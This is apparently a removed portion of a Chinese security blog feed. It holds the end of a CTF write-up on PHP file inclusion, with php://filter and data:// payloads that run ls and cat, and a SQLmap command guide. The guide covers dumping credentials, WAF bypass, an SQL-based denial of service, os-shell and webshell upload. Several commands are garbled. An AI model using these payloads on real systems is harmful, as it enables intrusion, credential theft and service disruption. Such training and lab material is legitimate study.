-<p>对于变量 user，当传进去的变量的参数作为文件名变量去打开时，可用 php:&#x2F;&#x2F;input 作为参数，同时使用 post 方式传入内容作为变量的文件内容。对于 file 变量，可以使用伪协议 php:&#x2F;&#x2F;filter 来读取 hint.php 文件。构造出的 payload 为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?txt=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202311051149941.png"><br>此时就得到了 hint.php 的源码的 base64 编码，解码后得到：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>接下来的内容关于 PHP 反序列化，可以前往博客<a href="https://www.cnblogs.com/linfangnan/p/13520608.html">CTF-WEB：PHP 反序列化</a>查看剩余步骤。</p>
-<h1 id="例题：攻防世界-Web-php-include"><a href="#例题：攻防世界-Web-php-include" class="headerlink" title="例题：攻防世界-Web_php_include"></a>例题：攻防世界-Web_php_include</h1><p>打开网页，看到一段 PHP 代码如下，观察到这段代码有 include() 函数，因此这题要考虑文件包含漏洞。<strong>strstr() 函数</strong>查找字符串首次出现的位置，然后返回字符串剩余部分。注意到这段代码使用了 strstr() 函数将传入参数中的 “php:&#x2F;&#x2F;” 全部删了，也就是说此处无法直接使用 PHP 伪协议来完成。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到这里还传递了一个参数 “hello”，我们尝试传一个参数进去，发现这个参数被回显回了网页。因此我们考虑以命令执行，然后命令执行的结果回显到浏览器，例如用 ls、cat 命令来查看。<br><img data-src="https://images.gaifagafin.top/202311051150500.png"><br>这里可以改用 data 伪协议来做，首先我们还是要先知道 flag 放在哪里，写出如下代码，则网页就会执行 ls 命令输出目录下的文件名。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>根据 data 伪协议的使用方法，我们需要把上述代码用 base64 编码然后传入：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202311051150138.png"><br>接下来就要查看 “fl4gisisish3r3.php” 这个文件的内容了，还是一样写出下面代码让网页执行 cat 命令查看文件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>还是一样把上述代码用 base64 编码然后传入，然后打开 F12 查看源码就能看到 flag。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQiKT8+</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>文章摘自：<a href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Basics</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-        <tag>伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLmap使用</title>
-    <url>/2023/10/29/SQLmap%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h2><p>(1) 猜解是否能注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; </span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 猜解表</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T admin -C <span class="string">&quot;username,password&quot;</span> </span><br><span class="line"> Linux: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T </span><br><span class="line"> admin -C <span class="string">&quot;username,[url=]B[/url]password&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h2><p>(1) cookie注入，猜解表</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows:  python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --table --level 2</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --columns -T </span></span><br><span class="line">admin <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 猜解内容</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --dump -T </span></span><br><span class="line">admin <span class="operator">-</span>C  &quot;username,password&quot; <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql</span></span><br><span class="line"><span class="operator">-</span>shell </span><br><span class="line">Linux: sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql-shell</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 输入执行语句完成DDOS攻击</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark (<span class="number">99999999999</span>,<span class="number">0x70726f62616e646f70726f62616e646f70726f62616e646f</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 通过2中的表得出列名(假如表为table_name)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="operator">-</span>C &quot;id,user,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h2><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
-<blockquote>
-<p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
-</blockquote>
-<ol>
-<li><p>浏览器打开目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;Login.asp</p>
-</li>
-<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
-</li>
-<li><p>点击login表单的submit按钮</p>
-</li>
-<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
-</li>
-<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
-</li>
-<li><p>运行sqlmap并使用如下命令：</p>
-</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="operator">/</span>sqlmap.py  <span class="operator">-</span> r <span class="keyword">search</span> <span class="operator">-</span> test.txt  <span class="operator">-</span> p tfUPass</span><br></pre></td></tr></table></figure>
-
-<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
-<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
-<p>几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</p>
-<p>(2) 自动的搜索</p>
-<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url]<span class="link">http://testasp.vulnweb.com/Login.asp</span>[<span class="string">/url</span>] --forms</span><br></pre></td></tr></table></figure>
-
-<p>(3) 指定参数搜索</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span>testasp.vulnweb.com<span class="operator">/</span>Login.asp[<span class="operator">/</span>url] <span class="comment">--data &quot;tfUName=321&amp;tfUPass=321&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的</p>
-<p>注入过程中如果选y是注入，如果不是选n</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>g inurl:php?id<span class="operator">=</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="comment">--dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span></span><br></pre></td></tr></table></figure>
-
-<p>参数</p>
-<h2 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h2><p>注入点:<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="operator">-</span>v <span class="number">3</span> <span class="comment">--dbs --batch --tamper &quot;space2morehash.py&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
-<p>都是编码方式</p>
-<p>space2hash.py base64encode.py charencode.py</p>
-<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php? id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
-
-<p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
-
-<p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="operator">-</span>C &quot;password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h2><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<p>此处采用的是Linux系统</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-cmd=ipconfig</span></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:&#x2F;www&#x2F;</p>
-<p>(2) 获取Shell</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:&#x2F;www&#x2F;</p>
-<p>输入ipconfig&#x2F;all</p>
-<p>创建用户和删除用户</p>
-<p>只要权限足够大，你可以输入使用任何命令。</p>
-<p>其他命令参考下面：</p>
-<p>从数据库中搜索字段</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c:\tools\request.txt&quot; <span class="operator">-</span>dbms mysql <span class="operator">-</span>D dedecms <span class="operator">-</span><span class="keyword">search</span> <span class="operator">-</span>C admin,password</span><br></pre></td></tr></table></figure>
-
-<p>在dedecms数据库中搜索字段admin或者password。</p>
-<p>读取与写入文件</p>
-<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<p>#示例：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c: \request.txt&quot;  <span class="operator">-</span>p id <span class="operator">-</span>dbms mysql <span class="operator">-</span>file<span class="operator">-</span>dest &quot;e:\php\htdocs\dvwa\inc\include\1. php&quot; <span class="operator">-</span>file <span class="operator">-</span>write &quot;f:\webshell\1112.php&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用shell命令：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c : \tools\request.txt&quot; <span class="operator">-</span>p id <span class="operator">-</span>dms mysql <span class="operator">-</span>os<span class="operator">-</span>shell</span><br></pre></td></tr></table></figure>
-
-<p>接下来指定网站可写目录：</p>
-<p>“E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
-<p>sqlmap详细命令：</p>
-<ul>
-<li>-is-dba 当前用户权限（是否为root权限）</li>
-<li>-dbs 所有数据库</li>
-<li>-current-db 网站当前数据库</li>
-<li>-users 所有数据库用户</li>
-<li>-current-user 当前数据库用户</li>
-<li>-random-agent 构造随机user-agent</li>
-<li>-passwords 数据库密码</li>
-<li>-proxy <a href="http://local:8080/">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
-<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-</ul>
-<p>Options（选项）：</p>
-<ul>
-<li>-version 显示程序的版本号并退出</li>
-<li>-h, -help 显示此帮助消息并退出</li>
-<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
-</ul>
-<p>Target（目标）：</p>
-<p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<ul>
-<li>-d DIRECT 直接连接到数据库。</li>
-<li>-u URL, -url&#x3D;URL 目标URL。</li>
-<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
-<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
-<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
-<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
-</ul>
-<p>Request（请求）：</p>
-<p>这些选项可以用来指定如何连接到目标URL。</p>
-<ul>
-<li>-data&#x3D;DATA 通过POST发送的数据字符串</li>
-<li>-cookie&#x3D;COOKIE HTTP Cookie头</li>
-<li>-cookie-urlencode URL 编码生成的cookie注入</li>
-<li>-drop-set-cookie 忽略响应的Set - Cookie头信息</li>
-<li>-user-agent&#x3D;AGENT 指定 HTTP User - Agent头</li>
-<li>-random-agent 使用随机选定的HTTP User - Agent头</li>
-<li>-referer&#x3D;REFERER 指定 HTTP Referer头</li>
-<li>-headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
-<li>-auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
-<li>-auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
-<li>-auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
-<li>-proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
-<li>-proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
-<li>-ignore-proxy 忽略系统默认的HTTP代理</li>
-<li>-delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
-<li>-timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
-<li>-retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
-<li>-scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
-<li>-safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
-<li>-safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
-</ul>
-<p>Enumeration（枚举）：</p>
-<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
-<ul>
-<li>-b, -banner 检索数据库管理系统的标识</li>
-<li>-current-user 检索数据库管理系统当前用户</li>
-<li>-current-db 检索数据库管理系统当前数据库</li>
-<li>-is-dba 检测DBMS当前用户是否DBA</li>
-<li>-users 枚举数据库管理系统用户</li>
-<li>-passwords 枚举数据库管理系统用户密码哈希</li>
-<li>-privileges 枚举数据库管理系统用户的权限</li>
-<li>-roles 枚举数据库管理系统用户的角色</li>
-<li>-dbs 枚举数据库管理系统数据库</li>
-<li>-D DBname 要进行枚举的指定数据库名</li>
-<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename -columns）</li>
-<li>-tables 枚举的DBMS数据库中的表</li>
-<li>-columns 枚举DBMS数据库表列</li>
-<li>-dump 转储数据库管理系统的数据库中的表项</li>
-<li>-dump-all 转储所有的DBMS数据库表中的条目</li>
-<li>-search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
-<li>-C COL 要进行枚举的数据库列</li>
-<li>-U USER 用来进行枚举的数据库用户</li>
-<li>-exclude-sysdbs 枚举表时排除系统数据库</li>
-<li>-start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
-<li>-stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
-<li>-first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
-<li>-last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
-<li>-sql-query&#x3D;QUERY 要执行的SQL语句</li>
-<li>-sql-shell 提示交互式SQL的shell</li>
-</ul>
-<p>Optimization（优化）：</p>
-<p>这些选项可用于优化SqlMap的性能。</p>
-<ul>
-<li>-o 开启所有优化开关</li>
-<li>-predict-output 预测常见的查询输出</li>
-<li>-keep-alive 使用持久的HTTP（S）连接</li>
-<li>-null-connection 从没有实际的HTTP响应体中检索页面长度</li>
-<li>-threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
-</ul>
-<p>Injection（注入）：</p>
-<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<ul>
-<li>-p TESTPARAMETER 可测试的参数（S）</li>
-<li>-dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
-<li>-os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
-<li>-prefix&#x3D;PREFIX 注入payload字符串前缀</li>
-<li>-suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
-<li>-tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
-</ul>
-<p>Detection（检测）：</p>
-<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<ul>
-<li>-level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
-<li>-risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
-<li>-string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
-<li>-regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
-<li>-text-only 仅基于在文本内容比较网页</li>
-</ul>
-<p>Techniques（技巧）：</p>
-<p>这些选项可用于调整具体的SQL注入测试。</p>
-<ul>
-<li>-technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
-<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-<li>-union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
-<li>-union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
-</ul>
-<p>Fingerprint（指纹）：</p>
-<ul>
-<li>-f, -fingerprint 执行检查广泛的DBMS版本指纹</li>
-</ul>
-<p>Brute force（蛮力）：</p>
-<p>这些选项可以被用来运行蛮力检查。</p>
-<ul>
-<li>-common-tables 检查存在共同表</li>
-<li>-common-columns 检查存在共同列</li>
-</ul>
-<p>User-defined function injection（用户自定义函数注入）：</p>
-<p>这些选项可以用来创建用户自定义函数。</p>
-<p>-udf-inject 注入用户自定义函数</p>
-<p>-shared-lib&#x3D;SHLIB 共享库的本地路径</p>
-<p>File system access（访问文件系统）：</p>
-<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<ul>
-<li>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
-<li>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
-<li>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
-</ul>
-<p>Operating system access（操作系统访问）：</p>
-<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<ul>
-<li>-os-cmd&#x3D;OSCMD 执行操作系统命令</li>
-<li>-os-shell 交互式的操作系统的shell</li>
-<li>-os-pwn 获取一个OOB shell，meterpreter或VNC</li>
-<li>-os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
-<li>-os-bof 存储过程缓冲区溢出利用</li>
-<li>-priv-esc 数据库进程用户权限提升</li>
-<li>-msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
-<li>-tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
-</ul>
-<p>Windows注册表访问：</p>
